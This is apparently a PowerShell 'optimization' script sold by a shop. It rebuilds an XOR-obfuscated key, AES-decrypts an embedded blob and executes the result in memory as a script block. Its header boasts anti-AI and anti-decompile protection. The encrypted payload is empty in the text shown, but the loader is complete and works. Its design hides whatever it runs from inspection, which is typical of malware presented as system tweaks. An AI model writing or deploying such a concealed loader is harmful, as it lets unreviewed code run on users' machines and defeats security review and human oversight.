# ========================================================
# RIEWJADDD SHOP - AES-256 MILITARY ENCRYPTED PAYLOAD
# ANTI-AI / ANTI-DECOMPILE / ZERO PLAINTEXT PROTECTION
# ========================================================
$EncryptedTweaks = ""

function Invoke-ProtectedOptimization {
    if (-not $global:_authLegit -or -not $authenticated) {
        Write-Host "  [ACCESS DENIED] Unauthorized execution bypass detected." -ForegroundColor Red
        exit 1
    }
    
    try {
        $secretSalt = _xd @(0x0F,0x14,0x18,0x0A,0x17,0x1C,0x19,0x19,0x19,0x02,0x16,0x18,0x0F,0x13,0x18,0x11,0x02,0x1C,0x18,0x0E,0x02,0x0E,0x18,0x1E,0x08,0x0F,0x18,0x02,0x6F,0x6D,0x6F,0x6B,0x02,0x1D,0x7E,0x7C) 0x5D
        $sha = [System.Security.Cryptography.SHA256]::Create()
        $keyBytes = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($secretSalt))
        
        $raw = [System.Convert]::FromBase64String($EncryptedTweaks)
        $iv = New-Object byte[] 16
        [System.Buffer]::BlockCopy($raw, 0, $iv, 0, 16)
        $cipher = New-Object byte[] ($raw.Length - 16)
        [System.Buffer]::BlockCopy($raw, 16, $cipher, 0, $cipher.Length)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.IV = $iv
        $decryptor = $aes.CreateDecryptor()
        $plainBytes = $decryptor.TransformFinalBlock($cipher, 0, $cipher.Length)
        $decryptedCode = [System.Text.Encoding]::UTF8.GetString($plainBytes)
        
        # Execute decrypted kernel tweaks in memory
        . ([ScriptBlock]::Create($decryptedCode))
    } catch {
        Write-Host "  [ERROR] Payload integrity check failed or corrupted key." -ForegroundColor Red
        exit 1
    }
}

Invoke-ProtectedOptimization
